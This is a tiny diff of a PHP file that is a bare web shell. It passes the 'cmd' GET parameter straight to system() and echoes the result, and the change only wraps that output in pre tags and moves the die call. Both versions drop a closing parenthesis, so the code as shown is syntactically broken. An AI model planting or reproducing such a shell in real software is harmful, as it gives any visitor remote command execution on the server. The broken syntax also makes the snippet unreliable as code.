@@ -1,6 +1,8 @@
 <?php
 	if(isset($_GET['cmd'])){
-		echo system($_GET['cmd'];
+		echo "<pre>";
+		system($_GET['cmd'];
+		echo "</pre>";
+		die;
 	}
-	die;
 ?>
